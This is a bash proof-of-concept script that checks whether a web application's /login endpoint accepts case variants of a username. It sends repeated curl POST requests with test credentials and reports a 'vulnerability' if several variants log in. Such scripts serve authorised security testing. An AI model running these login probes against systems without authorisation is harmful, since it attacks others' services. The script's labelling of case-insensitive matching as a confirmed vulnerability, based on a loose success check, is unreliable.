#!/bin/bash

# POC: Weak Input Validation - Case-Insensitive Username Matching
# This script demonstrates that the authentication mechanism accepts usernames
# in different case variants (uppercase, lowercase, mixed case) and still
# authenticates successfully despite case differences.

TARGET_URL="${1:-http://localhost:8080}"
USERNAME_VARIANTS=("test" "TEST" "Test" "teSt")
PASSWORD="test"

echo "=========================================="
echo "Weak Input Validation - Case Sensitivity"
echo "=========================================="
echo "Target: $TARGET_URL/login"
echo "Testing username case variants..."
echo ""

# Track successful authentications
successful_variants=0
failed_variants=0

for username in "${USERNAME_VARIANTS[@]}"; do
    echo -n "Testing username: '$username' ... "
    
    # Send login request with case variant - capture response and headers
    http_code=$(curl -s -o /tmp/response.txt -w "%{http_code}" -X POST \
        -d "username=$username&password=$PASSWORD" \
        "$TARGET_URL/login" 2>&1)
    
    response=$(cat /tmp/response.txt)
    
    # Check for successful response indicators
    # Success could be: 302 redirect, or 200 with redirect in body, or location header
    if [ "$http_code" = "302" ] || [ "$http_code" = "200" ]; then
        # Check if response contains home page content or redirect
        if echo "$response" | grep -q "home\|Home\|dashboard\|Dashboard" || [ "$http_code" = "302" ]; then
            echo "✓ SUCCESS (HTTP $http_code)"
            successful_variants=$((successful_variants + 1))
        else
            echo "✗ FAILED (HTTP $http_code, no home page)"
            failed_variants=$((failed_variants + 1))
        fi
    else
        echo "✗ FAILED (HTTP $http_code)"
        failed_variants=$((failed_variants + 1))
    fi
done

rm -f /tmp/response.txt

echo ""
echo "=========================================="
echo "Results Summary:"
echo "=========================================="
echo "Successful authentications with different cases: $successful_variants"
echo "Failed authentications: $failed_variants"
echo ""

if [ $successful_variants -gt 1 ]; then
    echo "✓ VULNERABILITY CONFIRMED!"
    echo "The application accepts multiple case variants for the same username."
    echo "This indicates weak input validation and case-insensitive matching."
    exit 0
else
    echo "✗ Test inconclusive - case-insensitivity not confirmed"
    exit 1
fi